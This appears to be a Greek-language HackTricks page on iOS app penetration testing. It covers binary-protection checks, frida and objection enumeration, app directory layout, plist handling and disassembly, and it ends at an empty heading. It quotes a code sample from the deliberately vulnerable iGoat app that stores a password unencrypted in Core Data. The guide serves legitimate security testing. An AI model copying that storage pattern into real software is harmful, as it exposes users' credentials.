# iOS Ελέγχος Ευπαθειών

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Βασικά για iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Περιβάλλον Δοκιμών

Σε αυτήν τη σελίδα μπορείτε να βρείτε πληροφορίες σχετικά με τον **εξομοιωτή iOS**, τους **εξομοιωτές** και το **jailbreaking:**

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Αρχική Ανάλυση

### Βασικές Λειτουργίες Ελέγχου iOS

Κατά τη διάρκεια του ελέγχου **θα προταθούν αρκετές λειτουργίες** (σύνδεση στη συσκευή, ανάγνωση/εγγραφή/μεταφόρτωση/λήψη αρχείων, χρήση ορισμένων εργαλείων...). Επομένως, αν δεν ξέρετε πώς να εκτελέσετε οποιαδήποτε από αυτές τις ενέργειες, παρακαλούμε, **ξεκινήστε διαβάζοντας τη σελίδα**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Για τα επόμενα βήματα **το app πρέπει να είναι εγκατεστημένο** στη συσκευή και πρέπει να έχετε ήδη αποκτήσει το **αρχείο IPA** της εφαρμογής.\
Διαβάστε τη σελίδα [Βασικές Λειτουργίες Ελέγχου iOS](basic-ios-testing-operations.md) για να μάθετε πώς να το κάνετε.
{% endhint %}

### Βασική Στατική Ανάλυση

Συνιστάται η χρήση του εργαλείου [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) για να πραγματοποιήσετε αυτόματη Στατική Ανάλυση στο αρχείο IPA.

Αναγνώριση των **προστασιών που υπάρχουν στο δυαδικό αρχείο**:

*   **PIE (Position Independent Executable)**: Όταν είναι ενεργοποιημένο, η εφαρμογή φορτώνεται σε μια τυχαία διεύθυνση μνήμης κάθε φορά που ξεκινά, κάνοντας πιο δύσκολο το να προβλέψετε την αρχική διεύθυνση μνήμης της.

```bash
otool -hv <app-binary> | grep PIE   # Θα πρέπει να περιλαμβάνει τη σημαία PIE
```
*   **Stack Canaries**: Για την επικύρωση της ακεραιότητας της στοίβας, τιμή 'canary' τοποθετείται στη στοίβα πριν από την κλήση μιας συνάρτησης και επαληθεύεται ξανά όταν η συνάρτηση τελειώνει.

```bash
otool -I -v <app-binary> | grep stack_chk   # Θα πρέπει να περιλαμβάνει τα σύμβολα: stack_chk_guard και stack_chk_fail
```
*   **ARC (Automatic Reference Counting)**: Για την πρόληψη κοινών ελαττωμάτων μνήμης

```bash
otool -I -v <app-binary> | grep objc_release   # Θα πρέπει να περιλαμβάνει το σύμβολο _objc_release
```
*   **Κρυπτογραφημένο Δυαδικό**: Το δυαδικό πρέπει να είναι κρυπτογραφημένο

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # Το cryptid πρέπει να είναι 1
```

**Αναγνώριση Ευαίσθητων/Ευάλωτων Συναρτήσεων**

*   **Αδύναμοι Αλγόριθμοι Κατακερματισμού**

```bash
# Στη συσκευή iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Στο Linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Ανασφαλείς Συναρτήσεις Τυχαίων Αριθμών**

```bash
# Στη συσκευή iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Στο Linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Ανασφαλής Συνάρτηση 'Malloc'**

```bash
# Στη συσκευή iOS
otool -Iv <app> | grep -w "_malloc"

# Στο Linux
grep -iER "_malloc"
```
*   **Ανασφαλείς και Ευάλωτες Συναρτήσεις**

```bash
# Στη συσκευή iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Στο Linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Βασική Δυναμική Ανάλυση

Ελέγξτε τη δυναμική ανάλυση που πραγματοποιεί το [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Θα πρέπει να πλοηγηθείτε μέσα από τις διάφορες προβολές και να αλληλεπιδράσετε μαζί τους, αλλά θα συνδέσει πολλές κλάσεις και θα ετοιμάσει έναν αναφορά όταν τελειώσετε.

### Κατάλογος Εγκατεστημένων Εφαρμογών

Χρησιμοποιήστε την εντολή `frida-ps -Uai` για να προσδιορίσετε το **αναγνωριστικό δέματος** των εγκατεστημένων εφαρμογών:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Βασική Απαρίθμηση & Hooking

Μάθετε πώς να **απαριθμήσετε τα στοιχεία της εφαρμογής** και πώς να **συνδέσετε μεθόδους και κλάσεις** εύκολα με το objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Δομή IPA

Η δομή ενός **αρχείου IPA** είναι ουσιαστικά αυτή ενός **συμπιεσμένου πακέτου**. Αλλάζοντας την επέκτασή του σε `.zip`, μπορεί να **αποσυμπιεστεί** για να αποκαλύψει το περιεχόμενό του. Μέσα σε αυτή τη δομή, ένα **Bundle** αντιπροσωπεύει μια πλήρως συσκευασμένη εφαρμογή έτοιμη για εγκατάσταση. Μέσα, θα βρείτε έναν κατάλογο με το όνομα `<NAME>.app`, ο οποίος ενθυλακώνει τους πόρους της εφαρμογής.

* **`Info.plist`**: Αυτό το αρχείο περιέχει συγκεκριμένες λεπτομέρειες ρύθμισης της εφαρμογής.
* **`_CodeSignature/`**: Αυτός ο κατάλογος περιλαμβάνει ένα αρχείο plist που περιέχει μια υπογραφή, εξασφαλίζοντας την ακεραιότητα όλων των αρχείων στο πακέτο.
* **`Assets.car`**: Ένα συμπιεσμένο αρχείο που αποθηκεύει αρχεία πόρων όπως εικονίδια.
* **`Frameworks/`**: Αυτός ο φάκελος φιλοξενεί τις native βιβλιοθήκες της εφαρμογής, οι οποίες μπορεί να είναι σε μορφή αρχείων `.dylib` ή `.framework`.
* **`PlugIns/`**: Αυτό μπορεί να περιλαμβάνει επεκτάσεις της εφαρμογής, γνωστές ως αρχεία `.appex`, αν και δεν είναι πάντα παρόντα.
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Χρησιμοποιείται για την αποθήκευση μόνιμων δεδομένων της εφαρμογής για χρήση χωρίς σύνδεση, για την προσωρινή αποθήκευση δεδομένων και για την προσθήκη λειτουργιών αναίρεσης στην εφαρμογή σας σε μια συσκευή. Για συγχρονισμό δεδομένων σε πολλές συσκευές σε έναν λογαριασμό iCloud, το Core Data αντιστοιχεί αυτόματα το σχήμα σας σε έναν χώρο CloudKit.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Το αρχείο `PkgInfo` είναι ένας εναλλακτικός τρόπος να καθορίσετε τους κωδικούς τύπου και δημιουργού της εφαρμογής ή του πακέτου σας.
* **en.lproj, fr.proj, Base.lproj**: Είναι τα πακέτα γλωσσών που περιέχουν πόρους για αυτές τις συγκεκριμένες γλώσσες, καθώς και έναν προεπιλεγμένο πόρο σε περίπτωση που μια γλώσσα δεν υποστηρίζεται.
* **Ασφάλεια**: Ο κατάλογος `_CodeSignature/` διαδραματίζει κρίσιμο ρόλο στην ασφάλεια της εφαρμογής επαληθεύοντας την ακεραιότητα όλων των συσκευασμένων αρχείων μέσω ψηφιακών υπογραφών.
* **Διαχείριση Πόρων**: Το αρχείο `Assets.car` χρησιμοποιεί συμπίεση για την αποτελεσματική διαχείριση γραφικών πόρων, το οποίο είναι κρίσιμο για τη βελτιστοποίηση της απόδοσης της εφαρμογής και τη μείωση του συνολικού μεγέθους της.
* **Βιβλιοθήκες και Πρόσθετα**: Αυτοί οι κατάλογοι υπογραμμίζουν την modularidad των εφαρμογών iOS, επιτρέποντας στους προγραμματιστές να συμπεριλάβουν επαναχρησιμοποιήσιμες βιβλιοθήκες κώδικα (`Frameworks/`) και να επεκτείνουν τη λειτουργικότητα της εφαρμογής (`PlugIns/`).
* **Τοπικοποίηση**: Η δομή υποστηρίζει πολλές γλώσσες, διευκολύνοντας την παγκόσμια επιτυχία της εφαρμογής με τη συμπερίληψη πόρων για συγκεκριμένα πακέτα γλωσσών.

**Info.plist**

Το **Info.plist** λειτουργεί ως κεφαλαιώδες στοιχείο για τις εφαρμογές iOS, ενθυλακώνοντας καίρια δεδομένα ρύθμισης σε μορφή **key-value** ζευγών. Αυτό το αρχείο είναι απαραίτητο όχι μόνο για τις εφαρμογές αλλά και για τις επεκτάσεις εφαρμογών και τις βιβλιοθήκες που συσκευάζονται μέσα. Είναι δομημένο είτε σε μορφή XML είτε σε δυαδική μορφή και περιέχει κρίσιμες πληροφορίες που κυμαίνονται από άδειες εφαρμογών έως ρυθμίσεις ασφαλείας. Για μια λεπτομερή εξερεύνηση των διαθέσιμων κλειδιών, μπορεί κανείς να ανατρέξει στην [**Τεκμηρίωση Προγραμματιστή της Apple**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc).

Για όσους επιθυμούν να εργαστούν με αυτό το αρχείο σε μια πιο προσβάσιμη μορφή, η μετατροπή σε XML μπορεί να επιτευχθεί εύκολα μέσω της χρήσης του `plutil` στο macOS (διαθέσιμο φυσικά στις εκδόσεις 10.2 και μετά) ή του `plistutil` στο Linux. Οι εντολές για τη μετατροπή είναι οι ακόλουθες:

* **Για macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
* **Για Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Ανάμεσα στον αμέτρητο αριθμό πληροφοριών που μπορεί να αποκαλύψει το **Info.plist** αρχείο, σημαντικές καταχωρήσεις περιλαμβάνουν τις συμβολοσειρές άδειας εφαρμογής (`UsageDescription`), τις προσαρμοσμένες σχήματα URL (`CFBundleURLTypes`), και τις ρυθμίσεις για την Ασφάλεια Μεταφοράς Εφαρμογής (`NSAppTransportSecurity`). Αυτές οι καταχωρήσεις, μαζί με άλλες όπως οι καταχωρήσεις προσαρμοσμένων τύπων εγγράφων που εξάγονται/εισάγονται (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), μπορούν να εντοπιστούν εύκολα ελέγχοντας το αρχείο ή χρησιμοποιώντας ένα απλό `grep` εντολή:
```bash
$ grep -i <keyword> Info.plist
```
**Διαδρομές Δεδομένων**

Στο περιβάλλον του iOS, οι κατάλογοι είναι ειδικά ορισμένοι για τις **εφαρμογές συστήματος** και τις **εφαρμογές που έχει εγκαταστήσει ο χρήστης**. Οι εφαρμογές συστήματος βρίσκονται στον κατάλογο `/Applications`, ενώ οι εφαρμογές που έχει εγκαταστήσει ο χρήστης τοποθετούνται κάτω από τον κατάλογο `/var/mobile/containers/Data/Application/`. Αυτές οι εφαρμογές είναι ανατεθειμένες ένα μοναδικό αναγνωριστικό γνωστό ως **128-bit UUID**, κάτι που καθιστά δύσκολη την χειροκίνητη εντοπισμό του φακέλου μιας εφαρμογής λόγω της τυχαιότητας των ονομάτων των καταλόγων.

{% hint style="warning" %}
Καθώς οι εφαρμογές στο iOS πρέπει να είναι σε λειτουργία αμμοθυμένου περιβάλλοντος, κάθε εφαρμογή θα έχει επίσης έναν φάκελο μέσα στον **`$HOME/Library/Containers`** με το **`CFBundleIdentifier`** της εφαρμογής ως όνομα φακέλου.

Ωστόσο, και οι δύο φάκελοι (φάκελοι δεδομένων & φάκελοι εμπορευμάτων) έχουν το αρχείο **`.com.apple.mobile_container_manager.metadata.plist`** που συνδέει και τους δύο φακέλους στο κλειδί `MCMetadataIdentifier`).
{% endhint %}

Για να διευκολύνει τον εντοπισμό του φακέλου εγκατάστασης μιας εφαρμογής που έχει εγκαταστήσει ο χρήστης, το εργαλείο **objection** παρέχει ένα χρήσιμο πλήκτρο, το `env`. Αυτή η εντολή αποκαλύπτει λεπτομερείς πληροφορίες καταλόγου για τη συγκεκριμένη εφαρμογή. Παρακάτω παρουσιάζεται ένα παράδειγμα πώς να χρησιμοποιηθεί αυτή η εντολή:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Εναλλακτικά, το όνομα της εφαρμογής μπορεί να αναζητηθεί μέσα στον φάκελο `/private/var/containers` χρησιμοποιώντας την εντολή `find`:
```bash
find /private/var/containers -name "Progname*"
```
Εντολές όπως `ps` και `lsof` μπορούν επίσης να χρησιμοποιηθούν για να αναγνωρίσουν τη διεργασία της εφαρμογής και να εμφανίσουν τη λίστα των ανοικτών αρχείων, αντίστοιχα, παρέχοντας εισαγωγές στις διαδρομές του ενεργού φακέλου της εφαρμογής:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Κατάλογος Bundle:**

* **AppName.app**
* Αυτός είναι ο Κατάλογος Εφαρμογής όπως φαίνεται πριν στο IPA, περιέχει τα απαραίτητα δεδομένα της εφαρμογής, στατικό περιεχόμενο καθώς και το μεταγλωττισμένο δυαδικό της εφαρμογής.
* Αυτός ο κατάλογος είναι ορατός στους χρήστες, αλλά **οι χρήστες δεν μπορούν να γράψουν σε αυτόν**.
* Το περιεχόμενο σε αυτόν τον κατάλογο δεν **είναι αντιγραφή ασφαλείας**.
* Τα περιεχόμενα αυτού του φακέλου χρησιμοποιούνται για τον έλεγχο της **υπογραφής του κώδικα**.

**Κατάλογος Δεδομένων:**

* **Documents/**
* Περιέχει όλα τα δεδομένα που δημιουργούνται από τον χρήστη. Ο τελικός χρήστης της εφαρμογής εκκινεί τη δημιουργία αυτών των δεδομένων.
* Ορατό στους χρήστες και **οι χρήστες μπορούν να γράψουν σε αυτόν**.
* Το περιεχόμενο σε αυτόν τον κατάλογο **είναι αντιγραφή ασφαλείας**.
* Η εφαρμογή μπορεί να απενεργοποιήσει διαδρομές με την ρύθμιση `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Περιέχει όλα τα **αρχεία που δεν είναι συγκεκριμένα για τον χρήστη**, όπως **cache**, **προτιμήσεις**, **cookies**, και αρχεία διαμόρφωσης λίστας ιδιοτήτων (plist).
* Οι εφαρμογές iOS συνήθως χρησιμοποιούν τους υποκαταλόγους `Application Support` και `Caches`, αλλά η εφαρμογή μπορεί να δημιουργήσει προσαρμοσμένους υποκαταλόγους.
* **Library/Caches/**
* Περιέχει **ημι-μόνιμα κρυφά αρχεία**.
* Αόρατο στους χρήστες και **οι χρήστες δεν μπορούν να γράψουν σε αυτόν**.
* Το περιεχόμενο σε αυτόν τον κατάλογο δεν **είναι αντιγραφή ασφαλείας**.
* Το λειτουργικό σύστημα μπορεί να διαγράψει αυτά τα αρχεία αυτόματα όταν η εφαρμογή δεν εκτελείται και ο χώρος αποθήκευσης είναι περιορισμένος.
* **Library/Application Support/**
* Περιέχει **μόνιμα αρχεία** που είναι απαραίτητα για την εκτέλεση της εφαρμογής.
* **Αόρατο** **στους** **χρήστες** και οι χρήστες δεν μπορούν να γράψουν σε αυτόν.
* Το περιεχόμενο σε αυτόν τον κατάλογο **είναι αντιγραφή ασφαλείας**.
* Η εφαρμογή μπορεί να απενεργοποιήσει διαδρομές με την ρύθμιση `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Χρησιμοποιείται για την αποθήκευση ιδιοτήτων που μπορούν **να διατηρηθούν ακόμα και μετά την επανεκκίνηση μιας εφαρμογής**.
* Οι πληροφορίες αποθηκεύονται, μη κρυπτογραφημένες, μέσα στο χώρο ασφαλείας της εφαρμογής σε ένα αρχείο plist που ονομάζεται \[BUNDLE\_ID].plist.
* Όλα τα ζεύγη κλειδιού/τιμής που αποθηκεύονται χρησιμοποιώντας το `NSUserDefaults` μπορούν να βρεθούν σε αυτό το αρχείο.
* **tmp/**
* Χρησιμοποιήστε αυτόν τον κατάλογο για να γράψετε **προσωρινά αρχεία** που δεν χρειάζεται να διατηρηθούν μεταξύ εκκινήσεων της εφαρμογής.
* Περιέχει μη-μόνιμα κρυφά αρχεία.
* **Αόρατο** στους χρήστες.
* Το περιεχόμενο σε αυτόν τον κατάλογο δεν είναι αντιγραφή ασφαλείας.
* Το λειτουργικό σύστημα μπορεί να διαγράψει αυτά τα αρχεία αυτόματα όταν η εφαρμογή δεν εκτελείται και ο χώρος αποθήκευσης είναι περιορισμένος.

Ας ρίξουμε μια πιο προσεκτική ματιά στον Κατάλογο Εφαρμογής (.app) του iGoat-Swift μέσα στον Κατάλογο Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Δυαδική Αναστροφή

Μέσα στον φάκελο `<application-name>.app` θα βρείτε ένα δυαδικό αρχείο που ονομάζεται `<application-name>`. Αυτό είναι το αρχείο που θα **εκτελεστεί**. Μπορείτε να πραγματοποιήσετε μια βασική επιθεώρηση του δυαδικού με το εργαλείο **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Έλεγξε αν η εφαρμογή είναι κρυπτογραφημένη**

Δες αν υπάρχει οποιαδήποτε έξοδος για:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Αποσυναρμολόγηση του δυαδικού κώδικα**

Αποσυναρμολόγηση της ενότητας κειμένου:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Για να εκτυπώσετε το τμήμα **Objective-C** της δειγματικής εφαρμογής μπορείτε να χρησιμοποιήσετε:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Για να αποκτήσετε έναν πιο συμπαγή κώδικα Objective-C μπορείτε να χρησιμοποιήσετε το [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ωστόσο, οι καλύτερες επιλογές για αποσυναρμολόγηση του δυαδικού κώδικα είναι: [**Hopper**](https://www.hopperapp.com/download.html?) και [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Αποθήκευση Δεδομένων

Για να μάθετε πώς το iOS αποθηκεύει δεδομένα στη συσκευή, διαβάστε αυτήν τη σελίδα:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Τα ακόλουθα μέρη για αποθήκευση πληροφοριών πρέπει να ελεγχθούν **αμέσως μετά την εγκατάσταση της εφαρμογής**, **μετά τον έλεγχο όλων των λειτουργιών** της εφαρμογής και ακόμη μετά το **αποσυνδεθείτε από έναν χρήστη και συνδεθείτε σε διαφορετικό**.\
Ο στόχος είναι να βρείτε **μη προστατευμένες ευαίσθητες πληροφορίες** της εφαρμογής (κωδικοί πρόσβασης, τοκεν), του τρέχοντος χρήστη και των προηγουμένων συνδεδεμένων χρηστών.
{% endhint %}

### Plist

Τα αρχεία **plist** είναι δομημένα αρχεία XML που **περιέχουν ζεύγη κλειδιού-τιμής**. Είναι ένας τρόπος αποθήκευσης μόνιμων δεδομένων, οπότε μερικές φορές μπορείτε να βρείτε **ευαίσθητες πληροφορίες σε αυτά τα αρχεία**. Συνιστάται να ελέγχετε αυτά τα αρχεία μετά την εγκατάσταση της εφαρμογής και μετά την εντατική χρήση της για να δείτε αν γράφονται νέα δεδομένα.

Ο πιο συνηθισμένος τρόπος να διατηρούνται δεδομένα σε αρχεία plist είναι μέσω της χρήσης του **NSUserDefaults**. Αυτό το αρχείο plist αποθηκεύεται μέσα στο αμμοδοχείο της εφαρμογής στο **`Library/Preferences/<appBundleID>.plist`**

Η κλάση [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) παρέχει ένα προγραμματιστικό περιβάλλον για την αλληλεπίδραση με το προεπιλεγμένο σύστημα. Το προεπιλεγμένο σύστημα επιτρέπει σε μια εφαρμογή να προσαρμόσει τη συμπεριφορά της σύμφωνα με τις **προτιμήσεις του χρήστη**. Τα δεδομένα που αποθηκεύονται από το `NSUserDefaults` μπορούν να προβληθούν στο πακέτο εφαρμογής. Αυτή η κλάση αποθηκεύει **δεδομένα** σε ένα αρχείο **plist**, αλλά προορίζεται να χρησιμοποιείται με μικρές ποσότητες δεδομένων.

Αυτά τα δεδομένα δεν μπορούν πλέον να προσπελαστούν απευθείας μέσω ενός αξιόπιστου υπολογιστή, αλλά μπορούν να προσπελαστούν μέσω ενός **αντιγράφου ασφαλείας**.

Μπορείτε να **ανακτήσετε** τις πληροφορίες που αποθηκεύονται χρησιμοποιώντας το **`NSUserDefaults`** χρησιμοποιώντας το `ios nsuserdefaults get` του objection.

Για να βρείτε όλα τα plist που χρησιμοποιεί η εφαρμογή, μπορείτε να έχετε πρόσβαση στο `/private/var/mobile/Containers/Data/Application/{APPID}` και να εκτελέσετε:
```bash
find ./ -name "*.plist"
```
Για να μετατρέψετε αρχεία από μορφή **XML ή δυαδική (bplist)** σε XML, υπάρχουν διάφορες μέθοδοι ανάλογα με το λειτουργικό σύστημά σας:

**Για τους χρήστες macOS:** Χρησιμοποιήστε την εντολή `plutil`. Είναι ένα ενσωματωμένο εργαλείο στο macOS (10.2+), σχεδιασμένο για αυτόν τον σκοπό:
```bash
$ plutil -convert xml1 Info.plist
```
**Για τους χρήστες του Linux:** Εγκαταστήστε πρώτα το `libplist-utils`, και στη συνέχεια χρησιμοποιήστε το `plistutil` για τη μετατροπή του αρχείου σας:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Εντός μιας Συνεδρίας Objection:** Για την ανάλυση κινητών εφαρμογών, ένα συγκεκριμένο πρόσταγμα σάς επιτρέπει να μετατρέψετε αρχεία plist απευθείας:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) είναι ένα πλαίσιο εργασίας για τη διαχείριση του επιπέδου μοντέλου αντικειμένων στην εφαρμογή σας. [Το Core Data μπορεί να χρησιμοποιήσει το SQLite ως μόνιμη αποθήκευση](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), αλλά το ίδιο το πλαίσιο δεν είναι μια βάση δεδομένων.\
Το CoreData δεν κρυπτογραφεί τα δεδομένα του από προεπιλογή. Ωστόσο, μπορεί να προστεθεί ένα επιπλέον επίπεδο κρυπτογράφησης στο CoreData. Δείτε το [GitHub Repo](https://github.com/project-imas/encrypted-core-data) για περισσότερες λεπτομέρειες.

Μπορείτε να βρείτε τις πληροφορίες SQLite Core Data μιας εφαρμογής στη διαδρομή `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Αν μπορείτε να ανοίξετε το SQLite και να έχετε πρόσβαση σε ευαίσθητες πληροφορίες, τότε βρήκατε μια λανθασμένη ρύθμιση.**

{% code title="Κώδικας από το iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) είναι ένα κατάστημα κλειδιών/τιμών που χτίστηκε πάνω στο SQLite.\
Καθώς οι βάσεις δεδομένων Yap είναι βάσεις δεδομένων sqlite, μπορείτε να τις βρείτε χρησιμοποιώντας την εντολή που προτάθηκε στην προηγούμενη ενότητα.

### Άλλες Βάσεις Δεδομένων SQLite

